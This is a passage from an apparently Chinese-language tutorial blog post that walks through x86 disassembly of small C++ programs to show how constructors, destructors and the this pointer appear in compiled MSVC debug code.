manager::manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D13F6    8BF4            mov     esi,esp</span><br><span class=\"line\">010D13F8    FF15 C4820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.getchar&gt;]        ; msvcr90d.getchar</span><br><span class=\"line\">010D13FE    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D1400    E8 54FDFFFF     call    010D1159</span><br><span class=\"line\">010D1405    C785 2CFFFFFF 0&gt;mov     dword ptr ss:[ebp-0xD4],0x0</span><br><span class=\"line\">010D140F    8D4D FB         lea     ecx,dword ptr ss:[ebp-0x5]</span><br><span class=\"line\">010D1412    E8 11FCFFFF     call    010D1028</span><br><span class=\"line\">//010D1028   /E9 33050000     jmp     manager::~manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D1417    8B85 2CFFFFFF   mov     eax,dword ptr ss:[ebp-0xD4]</span><br><span class=\"line\">010D141D    52              push    edx</span><br><span class=\"line\">010D141E    8BCD            mov     ecx,ebp</span><br><span class=\"line\">010D1420    50              push    eax</span><br><span class=\"line\">010D1421    8D15 44140D01   lea     edx,dword ptr ds:[0x10D1444]</span><br><span class=\"line\">010D1427    E8 6AFCFFFF     call    010D1096</span><br><span class=\"line\">010D142C    58              pop     eax</span><br><span class=\"line\">010D142D    5A              pop     edx</span><br><span class=\"line\">010D142E    5F              pop     edi</span><br><span class=\"line\">010D142F    5E              pop     esi</span><br><span class=\"line\">010D1430    5B              pop     ebx</span><br><span class=\"line\">010D1431    81C4 D8000000   add     esp,0xD8</span><br><span class=\"line\">010D1437    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D1439    E8 1BFDFFFF     call    010D1159</span><br><span class=\"line\">010D143E    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D1440    5D              pop     ebp</span><br><span class=\"line\">010D1441    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D1118</span><br><span class=\"line\">010D1118   /E9 63030000     jmp     manager::manager</span><br><span class=\"line\"></span><br><span class=\"line\">010D1480 &gt;  55              push    ebp</span><br><span class=\"line\">010D1481    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D1483    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">010D1489    53              push    ebx</span><br><span class=\"line\">010D148A    56              push    esi</span><br><span class=\"line\">010D148B    57              push    edi</span><br><span class=\"line\">010D148C    51              push    ecx</span><br><span class=\"line\">010D148D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">010D1493    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">010D1498    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D149D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">010D149F    59              pop     ecx</span><br><span class=\"line\">010D14A0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">010D14A3    8B4D F8         mov     ecx,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D14A6    E8 FAFBFFFF     call    010D10A5</span><br><span class=\"line\">//010D10A5   /E9 46040000     jmp     employee::employee</span><br><span class=\"line\"></span><br><span class=\"line\">-</span><br><span class=\"line\">010D14AB    8BF4            mov     esi,esp</span><br><span class=\"line\">010D14AD    68 3C570D01     push    010D573C                              ; ASCII &quot;manager()!\\n&quot;</span><br><span class=\"line\">010D14B2    FF15 BC820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">010D14B8    83C4 04         add     esp,0x4</span><br><span class=\"line\">010D14BB    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D14BD    E8 97FCFFFF     call    010D1159</span><br><span class=\"line\">010D14C2    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D14C5    5F              pop     edi</span><br><span class=\"line\">010D14C6    5E              pop     esi</span><br><span class=\"line\">010D14C7    5B              pop     ebx</span><br><span class=\"line\">010D14C8    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">010D14CE    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D14D0    E8 84FCFFFF     call    010D1159</span><br><span class=\"line\">010D14D5    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D14D7    5D              pop     ebp</span><br><span class=\"line\">010D14D8    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D1412    E8 11FCFFFF     call    010D1028</span><br><span class=\"line\">010D1028   /E9 33050000     jmp     manager::~manager</span><br><span class=\"line\"></span><br><span class=\"line\">010D1560 &gt;  55              push    ebp</span><br><span class=\"line\">010D1561    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D1563    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">010D1569    53              push    ebx</span><br><span class=\"line\">010D156A    56              push    esi</span><br><span class=\"line\">010D156B    57              push    edi</span><br><span class=\"line\">010D156C    51              push    ecx</span><br><span class=\"line\">010D156D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">010D1573    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">010D1578    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D157D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">010D157F    59              pop     ecx</span><br><span class=\"line\">010D1580    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">010D1583    8BF4            mov     esi,esp</span><br><span class=\"line\">010D1585    68 5C570D01     push    010D575C                                  ; ASCII &quot;~maneger()!\\n&quot;</span><br><span class=\"line\">010D158A    FF15 BC820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]         ; msvcr90d.printf</span><br><span class=\"line\">010D1590    83C4 04         add     esp,0x4</span><br><span class=\"line\">010D1593    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D1595    E8 BFFBFFFF     call    010D1159</span><br><span class=\"line\">010D159A    8B4D F8         mov     ecx,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D159D    E8 8BFAFFFF     call    010D102D</span><br><span class=\"line\">//010D102D   /E9 9E050000     jmp     employee::~employee</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D15A2    5F              pop     edi</span><br><span class=\"line\">010D15A3    5E              pop     esi</span><br><span class=\"line\">010D15A4    5B              pop     ebx</span><br><span class=\"line\">010D15A5    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">010D15AB    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D15AD    E8 A7FBFFFF     call    010D1159</span><br><span class=\"line\">010D15B2    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D15B4    5D              pop     ebp</span><br><span class=\"line\">010D15B5    C3              retn</span><br></pre></td></tr></table></figure>\n<p>private</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\temployee() &#123; printf(&quot;employee()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~employee() &#123; printf(&quot;~employee()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class manager : public employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tmanager() &#123; printf(&quot;manager()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~manager() &#123;  printf(&quot;~maneger()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"从反汇编角度看this指针\"><a class=\"markdownIt-Anchor\" href=\"#从反汇编角度看this指针\">#</a> 从反汇编角度看 this 指针</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"> </span><br><span class=\"line\">struct MyStruct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int x ;</span><br><span class=\"line\">    int y ;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">//函数在结构体外部</span><br><span class=\"line\">void Max(MyStruct* str)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (str-&gt;x &gt; str-&gt;y)</span><br><span class=\"line\">        printf(&quot;%d&quot;,str-&gt;x);</span><br><span class=\"line\">    else</span><br><span class=\"line\">        printf(&quot;%d&quot;,str-&gt;y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MyStruct haha ;</span><br><span class=\"line\">    haha.x = 1 ;</span><br><span class=\"line\">    haha.y = 2 ;</span><br><span class=\"line\">    Max(&amp;haha);</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,sizeof(haha));</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012A1450 &gt;  55              push    ebp</span><br><span class=\"line\">012A1451    8BEC            mov     ebp,esp</span><br><span class=\"line\">012A1453    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">012A1459    53              push    ebx</span><br><span class=\"line\">012A145A    56              push    esi</span><br><span class=\"line\">012A145B    57              push    edi</span><br><span class=\"line\">012A145C    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">012A1462    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">012A1467    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">012A146C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">012A146E    C745 F4 0100000&gt;mov     dword ptr ss:[ebp-0xC],0x1</span><br><span class=\"line\">012A1475    C745 F8 0200000&gt;mov     dword ptr ss:[ebp-0x8],0x2</span><br><span class=\"line\">012A147C    8D45 F4         lea     eax,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">012A147F    50              push    eax</span><br><span class=\"line\">012A1480    E8 CAFCFFFF     call    012A114F</span><br><span class=\"line\">//012A114F   /E9 5C020000     jmp     Max</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">012A1485    83C4 04         add     esp,0x4</span><br><span class=\"line\">012A1488    8BF4            mov     esi,esp</span><br><span class=\"line\">012A148A    6A 08           push    0x8</span><br><span class=\"line\">012A148C    68 40572A01     push    012A5740                         ; ASCII &quot;%d\\n&quot;</span><br><span class=\"line\">012A1491    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;&gt;; msvcr90d.printf</span><br><span class=\"line\">012A1497    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A149A    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A149C    E8 A4FCFFFF     call    012A1145</span><br><span class=\"line\">012A14A1    33C0            xor     eax,eax</span><br><span class=\"line\">012A14A3    52              push    edx</span><br><span class=\"line\">012A14A4    8BCD            mov     ecx,ebp</span><br><span class=\"line\">012A14A6    50              push    eax</span><br><span class=\"line\">012A14A7    8D15 C8142A01   lea     edx,dword ptr ds:[0x12A14C8]</span><br><span class=\"line\">012A14AD    E8 DAFBFFFF     call    012A108C</span><br><span class=\"line\">012A14B2    58              pop     eax</span><br><span class=\"line\">012A14B3    5A              pop     edx</span><br><span class=\"line\">012A14B4    5F              pop     edi</span><br><span class=\"line\">012A14B5    5E              pop     esi</span><br><span class=\"line\">012A14B6    5B              pop     ebx</span><br><span class=\"line\">012A14B7    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">012A14BD    3BEC            cmp     ebp,esp</span><br><span class=\"line\">012A14BF    E8 81FCFFFF     call    012A1145</span><br><span class=\"line\">012A14C4    8BE5            mov     esp,ebp</span><br><span class=\"line\">012A14C6    5D              pop     ebp</span><br><span class=\"line\">012A14C7    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>当 haha.x-&gt; 1 和 haha.x -&gt; 2</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221110101344910.png\" alt=\"image-20221110101344910\"></p>\n<p>Max:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012A13B0 &gt;  55              push    ebp</span><br><span class=\"line\">012A13B1    8BEC            mov     ebp,esp</span><br><span class=\"line\">012A13B3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">012A13B9    53              push    ebx</span><br><span class=\"line\">012A13BA    56              push    esi</span><br><span class=\"line\">012A13BB    57              push    edi</span><br><span class=\"line\">012A13BC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">012A13C2    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">012A13C7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">012A13CC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">012A13CE    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13D1    8B4D 08         mov     ecx,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13D4    8B10            mov     edx,dword ptr ds:[eax]</span><br><span class=\"line\">012A13D6    3B51 04         cmp     edx,dword ptr ds:[ecx+0x4]</span><br><span class=\"line\">012A13D9    7E 1F           jle     short 012A13FA</span><br><span class=\"line\">012A13DB    8BF4            mov     esi,esp</span><br><span class=\"line\">012A13DD    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13E0    8B08            mov     ecx,dword ptr ds:[eax]</span><br><span class=\"line\">012A13E2    51              push    ecx</span><br><span class=\"line\">012A13E3    68 3C572A01     push    012A573C                               ; ASCII &quot;%d&quot;</span><br><span class=\"line\">012A13E8    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]      ; msvcr90d.printf</span><br><span class=\"line\">012A13EE    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A13F1    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A13F3    E8 4DFDFFFF     call    012A1145</span><br><span class=\"line\">012A13F8    EB 1E           jmp     short 012A1418</span><br><span class=\"line\">012A13FA    8BF4            mov     esi,esp</span><br><span class=\"line\">012A13FC    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13FF    8B48 04         mov     ecx,dword ptr ds:[eax+0x4]</span><br><span class=\"line\">012A1402    51              push    ecx</span><br><span class=\"line\">012A1403    68 3C572A01     push    012A573C                               ; ASCII &quot;%d&quot;</span><br><span class=\"line\">012A1408    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]      ; msvcr90d.printf</span><br><span class=\"line\">012A140E    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A1411    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A1413    E8 2DFDFFFF     call    012A1145</span><br><span class=\"line\">012A1418    5F              pop     edi</span><br><span class=\"line\">012A1419    5E              pop     esi</span><br><span class=\"line\">012A141A    5B              pop     ebx</span><br><span class=\"line\">012A141B    81C4 C0000000   add     esp,0xC0</span><br><span class=\"line\">012A1421    3BEC            cmp     ebp,esp</span><br><span class=\"line\">012A1423    E8 1DFDFFFF     call    012A1145</span><br><span class=\"line\">012A1428    8BE5            mov     esp,ebp</span><br><span class=\"line\">012A142A    5D              pop     ebp</span><br><span class=\"line\">012A142B    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>this 看 ecx</p>\n<p>ecx 在内存中为：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221110101730211.png\" alt=\"image-20221110101730211\"></p>\n<h3 id=\"反汇编中构造函数和析构函数的识别\"><a class=\"markdownIt-Anchor\" href=\"#反汇编中构造函数和析构函数的识别\">#</a> 反汇编中构造函数和析构函数的识别</h3>\n<p>代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class MyTest</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    MyTest();</span><br><span class=\"line\">    ~MyTest();</span><br><span class=\"line\">    void SetTest(DWORD dwTest);</span><br><span class=\"line\">    DWORD GetTest();</span><br><span class=\"line\">public:</span><br><span class=\"line\">    DWORD m_dwTest;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> MyTest::MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     printf(&quot;1111\\n&quot;);</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> MyTest::~MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">    printf(&quot;2222\\n&quot;);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void MyTest::SetTest(DWORD dwTest)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    this-&gt;m_dwTest = dwTest;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD MyTest::GetTest()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return this-&gt;m_dwTest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMyTest Test;</span><br><span class=\"line\">\tTest.SetTest(1);</span><br><span class=\"line\">\tint Number = Test.GetTest();</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对应的汇编代码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D11550 &gt;  55              push    ebp</span><br><span class=\"line\">00D11551    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D11553    6A FF           push    -0x1</span><br><span class=\"line\">00D11555    68 E846D100     push    00D146E8</span><br><span class=\"line\">00D1155A    64:A1 00000000  mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00D11560    50              push    eax</span><br><span class=\"line\">00D11561    81EC E4000000   sub     esp,0xE4</span><br><span class=\"line\">00D11567    53              push    ebx</span><br><span class=\"line\">00D11568    56              push    esi</span><br><span class=\"line\">00D11569    57              push    edi</span><br><span class=\"line\">00D1156A    8DBD 10FFFFFF   lea     edi,dword ptr ss:[ebp-0xF0]</span><br><span class=\"line\">00D11570    B9 39000000     mov     ecx,0x39</span><br><span class=\"line\">00D11575    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D1157A    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D1157C    A1 0080D100     mov     eax,dword ptr ds:[__security_coo&gt;</span><br><span class=\"line\">00D11581    33C5            xor     eax,ebp</span><br><span class=\"line\">00D11583    50              push    eax</span><br><span class=\"line\">00D11584    8D45 F4         lea     eax,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">00D11587    64:A3 00000000  mov     dword ptr fs:[0],eax</span><br><span class=\"line\">00D1158D    8D4D EC         lea     ecx,dword ptr 